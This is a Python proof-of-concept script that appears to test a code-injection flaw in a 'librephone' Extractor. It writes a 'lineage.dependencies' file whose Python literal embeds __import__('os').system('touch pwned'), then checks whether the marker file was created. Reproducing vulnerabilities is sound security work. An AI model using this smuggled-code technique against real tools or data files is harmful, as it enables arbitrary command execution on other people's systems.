import os
import shutil
import sys
from librephone.extractor import Extractor

def main():
    # Setup directories
    base_dir = "vuln_test"
    if os.path.exists(base_dir):
        shutil.rmtree(base_dir)
    os.makedirs(base_dir, exist_ok=True)

    # Create device directory: .../vendor/model
    # The code uses absolute path parts, so we need depth
    device_dir = os.path.abspath(os.path.join(base_dir, "vendor", "model"))
    os.makedirs(device_dir, exist_ok=True)

    # Create fake img to avoid early exit in clone
    with open(os.path.join(device_dir, "system.img"), "w") as f:
        f.write("fake img")

    # Fake lineage dir structure
    lineage_dir = os.path.abspath(os.path.join(base_dir, "lineage"))
    os.makedirs(lineage_dir, exist_ok=True)

    # The Extractor calculates devdir based on indir path components.
    # If indir is .../vendor/model
    # tmp[-2] is vendor
    # build is model (if unknown)
    # devdir = vendor/model

    # It looks for propfile at {lineage}/device/{devdir}/proprietary-files.txt
    prop_dir = os.path.join(lineage_dir, "device", "vendor", "model")
    os.makedirs(prop_dir, exist_ok=True)

    # Create malicious lineage.dependencies
    # This valid python syntax (a tuple of dicts) but contains a side effect
    malicious_code = "[{'target_path': 'foo', 'side_effect': __import__('os').system('touch pwned')}]"

    with open(os.path.join(prop_dir, "lineage.dependencies"), "w") as f:
        f.write(malicious_code)

    # Run Extractor
    extractor = Extractor()
    # Mock mount/unmount to avoid sudo and errors
    extractor.mount = lambda x: True
    extractor.unmount = lambda x: True
    # Mock parse_proprietary_file to avoid errors if it gets there
    extractor.parse_proprietary_file = lambda x: {}

    # Mock get_devpath to return 'model' so devdir matches our structure
    extractor.get_devpath = lambda x: "model"

    print(f"Running clone with lineage={lineage_dir}, indir={device_dir}")
    try:
        extractor.clone(lineage=lineage_dir, indir=device_dir, outdir="out")
    except Exception as e:
        print(f"Exception caught (expected due to minimal env): {e}")

    if os.path.exists("pwned"):
        print("VULNERABILITY CONFIRMED: pwned file created!")
        sys.exit(1) # Fail if confirmed (exit code 1 is usually error, but here it confirms vul)
    else:
        print("Vulnerability not triggered.")
        sys.exit(0)

if __name__ == "__main__":
    main()
